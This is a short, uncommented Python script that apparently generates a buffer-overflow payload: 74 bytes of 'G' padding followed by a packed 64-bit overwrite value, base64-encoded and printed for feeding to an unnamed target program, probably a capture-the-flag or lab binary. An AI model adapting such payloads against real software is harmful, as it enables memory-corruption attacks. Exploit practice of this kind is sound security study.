
import sys
import struct
import base64

buf = b'GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG'
buf += struct.pack('<Q', 11390989330525858186)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
